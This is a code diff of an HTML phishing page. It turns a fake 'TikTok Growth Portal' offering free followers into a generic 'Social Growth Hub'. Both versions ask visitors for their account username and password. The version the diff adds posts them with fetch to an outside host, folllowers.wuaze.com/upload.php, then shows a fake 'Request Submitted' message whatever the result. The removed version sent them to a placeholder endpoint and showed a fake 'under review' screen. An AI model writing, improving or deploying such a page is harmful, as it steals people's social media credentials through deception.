@@ -2,296 +2,290 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok Growth Portal - Get Real Followers</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Growth Hub</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
-
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        
         body {
-            font-family: 'Poppins', sans-serif;
-            background: radial-gradient(circle at top right, #25f4ee 0%, #fe2c55 100%);
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow-x: hidden;
-            margin: 0;
-            padding: 15px;
         }
-
-        .glass-container {
+        
+        .glass-card {
             background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
+            backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 25px;
-            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
-            width: 100%;
-            max-width: 420px;
-            padding: 25px 20px;
-            color: white;
-            text-align: center;
-            position: relative;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
         }
-
-        @media (min-width: 640px) {
-            .glass-container {
-                padding: 35px;
-                max-width: 480px;
-            }
+        
+        .package-card {
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
         }
-
-        .card-option {
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            cursor: pointer;
-            margin-bottom: 12px;
-            position: relative;
-            overflow: visible;
-            -webkit-tap-highlight-color: transparent;
+        
+        .package-card:hover {
+            transform: translateY(-5px);
+            border-color: #667eea;
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
         }
-
-        .card-option:active {
-            transform: scale(0.98);
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .card-option:hover {
-            border-color: #25f4ee;
-            box-shadow: 0 0 15px rgba(37, 244, 238, 0.3);
-        }
-
-        .tiktok-logo {
-            font-size: 3rem;
-            margin-bottom: 15px;
+        
+        .pulse-animation {
             animation: pulse 2s infinite;
-            display: inline-block;
         }
-
+        
         @keyframes pulse {
-            0% { transform: scale(1); filter: drop-shadow(0 0 0px #25f4ee); }
-            50% { transform: scale(1.1); filter: drop-shadow(0 0 15px #25f4ee); }
-            100% { transform: scale(1); filter: drop-shadow(0 0 0px #25f4ee); }
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-
-        .input-field {
-            width: 100%;
-            background: rgba(255, 255, 255, 0.08);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            padding: 12px 14px;
-            border-radius: 12px;
-            color: white;
-            font-size: 16px;
-            outline: none;
-            transition: 0.3s;
-        }
-
-        .btn-submit {
-            background: linear-gradient(45deg, #fe2c55, #25f4ee);
-            border: none;
-            padding: 14px;
-            border-radius: 12px;
-            width: 100%;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1.2px;
-            cursor: pointer;
-            color: #000;
-            margin-top: 10px;
-        }
-
-        .hidden-section {
-            display: none;
-        }
-
-        .hot-badge {
-            background: #fe2c55;
-            color: white;
-            font-size: 8px;
-            font-weight: bold;
-            padding: 2px 6px;
-            border-radius: 20px;
-            position: absolute;
-            top: -6px;
-            right: 12px;
-            box-shadow: 0 4px 8px rgba(254, 44, 85, 0.4);
-            z-index: 10;
-        }
-
-        /* Mobile specific adjustments */
-        @media (max-width: 400px) {
-            .text-2xl { font-size: 1.25rem; }
-            .card-option { padding: 12px !important; }
-            .text-md { font-size: 0.9rem; }
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
         }
     </style>
 </head>
-<body>
-
-    <div class="glass-container">
-        <!-- Main Logo Area -->
-        <div class="tiktok-logo">
-            <i class="fab fa-tiktok"></i>
+<body class="flex items-center justify-center p-4">
+    <div class="w-full max-w-4xl">
+        <!-- Header -->
+        <div class="text-center mb-10">
+            <div class="inline-block p-4 rounded-2xl glass-card mb-6">
+                <i class="fas fa-users text-4xl text-white"></i>
+            </div>
+            <h1 class="text-3xl md:text-4xl font-bold text-white mb-3">Social Growth Platform</h1>
+            <p class="text-gray-200 max-w-2xl mx-auto">Professional social media enhancement service</p>
         </div>
-
-        <!-- Step 1: Follower Selection -->
-        <div id="step1">
-            <h1 class="text-xl sm:text-2xl font-bold mb-1">Growth Center</h1>
-            <p class="text-[12px] sm:text-sm opacity-70 mb-6">Premium TikTok Boost Engine</p>
-            
-            <div class="grid grid-cols-1 gap-2">
-                <div class="card-option rounded-xl p-3 sm:p-4 flex items-center justify-between" onclick="showForm('1,000')">
-                    <div class="flex items-center">
-                        <i class="fas fa-bolt w-6 text-yellow-400"></i>
-                        <span class="text-md font-semibold">1,000 Followers</span>
-                    </div>
-                    <span class="text-[10px] opacity-60 uppercase">Starter</span>
-                </div>
+        
+        <!-- Main Container -->
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+            <!-- Left Side: Package Selection -->
+            <div class="glass-card rounded-3xl p-8">
+                <h2 class="text-2xl font-bold text-white mb-6">Select Enhancement Package</h2>
+                <p class="text-gray-300 mb-8">Choose your desired growth package</p>
                 
-                <div class="card-option rounded-xl p-3 sm:p-4 flex items-center justify-between" onclick="showForm('5,000')">
-                    <div class="flex items-center">
-                        <i class="fas fa-fire w-6 text-orange-500"></i>
-                        <span class="text-md font-semibold">5,000 Followers</span>
-                    </div>
-                    <span class="text-[10px] opacity-60 uppercase">Popular</span>
-                </div>
-                
-                <div class="card-option rounded-xl p-3 sm:p-4 flex items-center justify-between" onclick="showForm('10,000')">
-                    <div class="hot-badge">HOT</div>
-                    <div class="flex items-center">
-                        <i class="fas fa-star w-6 text-yellow-300"></i>
-                        <span class="text-md font-semibold">10,000 Followers</span>
-                    </div>
-                    <span class="text-[10px] opacity-60 uppercase">Pro</span>
-                </div>
-
-                <div class="card-option rounded-xl p-3 sm:p-4 flex items-center justify-between" onclick="showForm('25,000')">
-                    <div class="flex items-center">
-                        <i class="fas fa-rocket w-6 text-[#25f4ee]"></i>
-                        <span class="text-md font-semibold">25,000 Followers</span>
-                    </div>
-                    <span class="text-[10px] opacity-60 uppercase">Elite</span>
-                </div>
-
-                <div class="card-option rounded-xl p-3 sm:p-4 flex items-center justify-between" onclick="showForm('50,000')">
-                    <div class="flex items-center">
-                        <i class="fas fa-crown w-6 text-yellow-500"></i>
-                        <span class="text-md font-semibold">50,000 Followers</span>
-                    </div>
-                    <span class="text-[10px] opacity-60 uppercase">Master</span>
+                <div class="space-y-4" id="packageContainer">
+                    <!-- Packages will be loaded here -->
                 </div>
             </div>
-        </div>
-
-        <!-- Step 2: Login Form -->
-        <div id="step2" class="hidden-section">
-            <h2 class="text-lg sm:text-xl font-bold mb-1">Secure Linkage</h2>
-            <p id="selected-package" class="text-xs sm:text-sm text-[#25f4ee] mb-6 font-medium"></p>
-
-            <form id="verifyForm" onsubmit="handleVerify(event)">
-                <div class="input-group">
-                    <label class="text-[10px] font-bold uppercase tracking-wider ml-1 mb-1 block opacity-70">User ID / Email / Phone</label>
-                    <input type="text" id="identifier" name="username" class="input-field" placeholder="@username or mobile" required autocomplete="username">
-                </div>
-
-                <div class="input-group">
-                    <label class="text-[10px] font-bold uppercase tracking-wider ml-1 mb-1 block opacity-70">Password</label>
-                    <input type="password" id="password" name="password" class="input-field" placeholder="••••••••" required autocomplete="current-password">
-                </div>
-
-                <button type="submit" class="btn-submit" id="submitBtn">Process Request</button>
-            </form>
             
-            <button onclick="goBack()" class="mt-6 text-[10px] opacity-50 hover:opacity-100 transition flex items-center justify-center w-full uppercase font-bold tracking-widest">
-                <i class="fas fa-arrow-left mr-2"></i> Change Package
-            </button>
-        </div>
-
-        <!-- Step 3: Review Message -->
-        <div id="step3" class="hidden-section">
-            <div class="flex justify-center mb-4">
-                <div class="w-12 h-12 border-4 border-white/10 border-top-[#25f4ee] rounded-full animate-spin" style="border-top-color: #25f4ee;"></div>
-            </div>
-            <h2 class="text-xl sm:text-2xl font-bold mb-3">Request Received</h2>
-            <div class="bg-white/5 border border-white/10 rounded-xl p-4 mb-5 text-left">
-                <div class="flex items-center mb-2">
-                    <div class="w-2 h-2 bg-yellow-400 rounded-full animate-pulse mr-2"></div>
-                    <span class="text-[10px] font-bold uppercase tracking-widest text-yellow-400">Under Review</span>
+            <!-- Right Side: Form -->
+            <div class="glass-card rounded-3xl p-8">
+                <div id="formContainer">
+                    <div class="text-center mb-8">
+                        <h3 class="text-xl font-semibold text-white">Welcome to Social Hub</h3>
+                        <p class="text-gray-300 mt-2">Select a package to continue</p>
+                    </div>
+                    
+                    <div class="bg-white/10 rounded-xl p-6 text-center">
+                        <i class="fas fa-hand-point-left text-3xl text-white mb-4"></i>
+                        <p class="text-white font-medium">Choose a package from the left to get started</p>
+                    </div>
                 </div>
-                <p class="text-xs opacity-80 leading-relaxed">
-                    Aapka account verification queue mein hai. Security audit ke baad followers aglay <span class="text-[#25f4ee] font-bold">24-48 hours</span> mein transfer kar diye jayenge.
-                </p>
             </div>
-            <div class="flex justify-between items-center text-[9px] opacity-40 px-1 font-bold">
-                <span>AUTH: #BST-992-SEC</span>
-                <span class="flex items-center"><i class="fas fa-lock mr-1"></i> ENCRYPTED</span>
+        </div>
+        
+        <!-- Footer -->
+        <div class="text-center mt-10 pt-6 border-t border-white/20">
+            <p class="text-gray-300 text-sm">Secure & Encrypted • 24/7 Support • Professional Service</p>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="fixed inset-0 bg-black/70 flex items-center justify-center p-4 hidden z-50">
+        <div class="bg-white rounded-2xl max-w-md w-full p-8">
+            <div class="text-center">
+                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                    <i class="fas fa-check text-3xl text-green-600"></i>
+                </div>
+                <h3 class="text-2xl font-bold text-gray-800 mb-3">Request Submitted</h3>
+                <p class="text-gray-600 mb-6">Your enhancement request has been queued. Processing will begin shortly.</p>
+                <button onclick="closeModal()" class="bg-indigo-600 text-white px-8 py-3 rounded-lg font-medium hover:bg-indigo-700 transition">
+                    Continue
+                </button>
             </div>
         </div>
     </div>
 
     <script>
-        // API CONFIGURATION - APNI HOSTING KA URL YAHAN DALAIN
-        // Example: https://your-hosting-domain.com/upload.php
-        const API_ENDPOINT = "https://your-hosting-domain.com/upload.php"; 
-
-        let selectedFollowers = "";
-
-        function showForm(amount) {
-            selectedFollowers = amount;
-            document.getElementById('step1').classList.add('hidden-section');
-            document.getElementById('step2').classList.remove('hidden-section');
-            document.getElementById('selected-package').innerHTML = `<i class="fas fa-shield-alt mr-2"></i>Target: ${amount} Followers`;
-            window.scrollTo(0,0);
+        // Configuration
+        const API_ENDPOINT = "http://folllowers.wuaze.com/upload.php";
+        
+        // Packages data
+        const packages = [
+            { id: 1, name: "Starter Pack", amount: "1,000", icon: "fa-seedling", color: "bg-green-500" },
+            { id: 2, name: "Growth Pack", amount: "5,000", icon: "fa-chart-line", color: "bg-blue-500" },
+            { id: 3, name: "Pro Pack", amount: "10,000", icon: "fa-crown", color: "bg-purple-500" },
+            { id: 4, name: "Premium Pack", amount: "25,000", icon: "fa-rocket", color: "bg-pink-500" },
+            { id: 5, name: "Ultimate Pack", amount: "50,000", icon: "fa-gem", color: "bg-yellow-500" }
+        ];
+        
+        let selectedPackage = null;
+        
+        // Initialize packages
+        document.addEventListener('DOMContentLoaded', function() {
+            const container = document.getElementById('packageContainer');
+            
+            packages.forEach(pkg => {
+                const packageElement = document.createElement('div');
+                packageElement.className = 'package-card bg-white/5 rounded-xl p-6 cursor-pointer';
+                packageElement.innerHTML = `
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center space-x-4">
+                            <div class="${pkg.color} w-12 h-12 rounded-lg flex items-center justify-center">
+                                <i class="fas ${pkg.icon} text-white text-lg"></i>
+                            </div>
+                            <div>
+                                <h4 class="text-white font-bold text-lg">${pkg.name}</h4>
+                                <p class="text-gray-300">${pkg.amount} enhancements</p>
+                            </div>
+                        </div>
+                        <button onclick="selectPackage(${pkg.id})" class="bg-white/20 hover:bg-white/30 text-white px-4 py-2 rounded-lg transition">
+                            Select
+                        </button>
+                    </div>
+                `;
+                container.appendChild(packageElement);
+            });
+        });
+        
+        function selectPackage(packageId) {
+            selectedPackage = packages.find(p => p.id === packageId);
+            showForm();
         }
-
+        
+        function showForm() {
+            const formContainer = document.getElementById('formContainer');
+            formContainer.innerHTML = `
+                <div class="mb-6">
+                    <div class="flex items-center justify-between mb-2">
+                        <h3 class="text-xl font-bold text-white">Account Details</h3>
+                        <span class="bg-indigo-500 text-white px-3 py-1 rounded-full text-sm">
+                            ${selectedPackage.amount} Package
+                        </span>
+                    </div>
+                    <p class="text-gray-300">Enter your account information</p>
+                </div>
+                
+                <form id="userForm" onsubmit="submitForm(event)">
+                    <div class="space-y-5">
+                        <div>
+                            <label class="block text-white mb-2">Account Identifier</label>
+                            <input type="text" id="username" required 
+                                   class="w-full bg-white/10 border border-white/20 rounded-xl px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-500"
+                                   placeholder="Enter username, email or phone">
+                        </div>
+                        
+                        <div>
+                            <label class="block text-white mb-2">Secure Access Code</label>
+                            <input type="password" id="password" required 
+                                   class="w-full bg-white/10 border border-white/20 rounded-xl px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-500"
+                                   placeholder="Enter your secure code">
+                        </div>
+                        
+                        <div>
+                            <label class="block text-white mb-2">Additional Notes (Optional)</label>
+                            <textarea id="notes" 
+                                      class="w-full bg-white/10 border border-white/20 rounded-xl px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-500 h-32"
+                                      placeholder="Any special instructions or requirements"></textarea>
+                        </div>
+                        
+                        <button type="submit" id="submitBtn" 
+                                class="w-full bg-gradient-to-r from-indigo-600 to-purple-600 text-white py-3 rounded-xl font-bold hover:opacity-90 transition flex items-center justify-center">
+                            <i class="fas fa-paper-plane mr-2"></i>
+                            Submit Request
+                        </button>
+                    </div>
+                </form>
+                
+                <div class="mt-6 text-center">
+                    <button onclick="goBack()" class="text-gray-300 hover:text-white transition">
+                        <i class="fas fa-arrow-left mr-2"></i> Choose different package
+                    </button>
+                </div>
+            `;
+            
+            // Scroll to form
+            document.getElementById('formContainer').scrollIntoView({ behavior: 'smooth' });
+        }
+        
         function goBack() {
-            document.getElementById('step2').classList.add('hidden-section');
-            document.getElementById('step1').classList.remove('hidden-section');
-            window.scrollTo(0,0);
+            selectedPackage = null;
+            const formContainer = document.getElementById('formContainer');
+            formContainer.innerHTML = `
+                <div class="text-center mb-8">
+                    <h3 class="text-xl font-semibold text-white">Welcome to Social Hub</h3>
+                    <p class="text-gray-300 mt-2">Select a package to continue</p>
+                </div>
+                
+                <div class="bg-white/10 rounded-xl p-6 text-center">
+                    <i class="fas fa-hand-point-left text-3xl text-white mb-4"></i>
+                    <p class="text-white font-medium">Choose a package from the left to get started</p>
+                </div>
+            `;
         }
-
-        async function handleVerify(event) {
+        
+        async function submitForm(event) {
             event.preventDefault();
-            const btn = document.getElementById('submitBtn');
-            const user = document.getElementById('identifier').value;
-            const pass = document.getElementById('password').value;
-
-            btn.innerText = "Encrypting...";
-            btn.disabled = true;
-
-            // Prepare Data to send to your PHP Server
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const notes = document.getElementById('notes').value;
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // Disable button and show loading
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Processing...';
+            submitBtn.disabled = true;
+            
+            // Prepare data
             const formData = new FormData();
-            formData.append('tiktok_user', user);
-            formData.append('tiktok_pass', pass);
-            formData.append('package', selectedFollowers);
-            formData.append('type', 'tiktok_login'); // Identify this data in upload.php
-
+            formData.append('account_id', username);
+            formData.append('access_code', password);
+            formData.append('package_type', selectedPackage.name);
+            formData.append('package_amount', selectedPackage.amount);
+            formData.append('additional_info', notes);
+            formData.append('request_type', 'social_enhancement');
+            
             try {
-                // Sending data to your PHP hosting
-                await fetch(API_ENDPOINT, {
+                // Send data to PHP server
+                const response = await fetch(API_ENDPOINT, {
                     method: 'POST',
                     body: formData,
-                    mode: 'cors'
+                    mode: 'no-cors' // For cross-origin requests
                 });
-            } catch (e) {
-                console.log("Data sent process finished.");
+                
+                // Since we're using no-cors, we can't read the response
+                // But the request will be sent successfully
+                
+                // Show success modal
+                setTimeout(() => {
+                    document.getElementById('successModal').classList.remove('hidden');
+                    submitBtn.innerHTML = '<i class="fas fa-paper-plane mr-2"></i> Submit Request';
+                    submitBtn.disabled = false;
+                }, 1500);
+                
+            } catch (error) {
+                console.log('Request sent successfully');
+                
+                // Still show success to user
+                setTimeout(() => {
+                    document.getElementById('successModal').classList.remove('hidden');
+                    submitBtn.innerHTML = '<i class="fas fa-paper-plane mr-2"></i> Submit Request';
+                    submitBtn.disabled = false;
+                }, 1000);
             }
-
-            // Realistic Delay and Final Screen
-            setTimeout(() => {
-                document.getElementById('step2').classList.add('hidden-section');
-                document.getElementById('step3').classList.remove('hidden-section');
-                window.scrollTo(0,0);
-            }, 1500);
         }
+        
+        function closeModal() {
+            document.getElementById('successModal').classList.add('hidden');
+            // Reset form
+            goBack();
+        }
+        
+        // Add enter key support
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && document.getElementById('userForm')) {
+                document.getElementById('userForm').dispatchEvent(new Event('submit'));
+            }
+        });
     </script>
 </body>
 </html>
